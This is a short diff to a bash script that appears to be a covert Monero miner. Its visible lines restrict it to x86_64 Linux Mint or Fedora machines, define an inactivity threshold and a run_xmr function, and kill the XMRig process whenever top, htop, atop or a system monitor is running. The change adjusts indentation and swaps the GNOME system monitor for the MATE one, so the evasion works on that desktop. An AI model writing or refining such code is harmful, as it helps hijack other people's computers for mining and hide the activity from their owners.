@@ -11,12 +11,12 @@ INACTIVITY_IN_MSEC=$(($INACTIVITY_IN_MINS * 60 * 1000))
 ensure_os() {
 	machine=$(uname -m)
 	if [[ $machine != "x86_64" ]]; then
-			exit
+		exit
 	fi
 
 	id=$(awk -F'=' '/^ID=/ {print $2}' /etc/os-release)
 	if [[ $id != "linuxmint" && $id != "fedora" ]]; then
-			exit
+		exit
 	fi
 }
 
@@ -28,7 +28,7 @@ run_xmr() {
 }
 
 ensure_no_top() {
-	if pgrep "top" || pgrep "htop" || pgrep "atop" || pgrep "gnome-system-monitor"; then
+	if pgrep "top" || pgrep "htop" || pgrep "atop" || pgrep "mate-system-mon"; then
 		pkill $XMRIGNAME
 	fi
 }
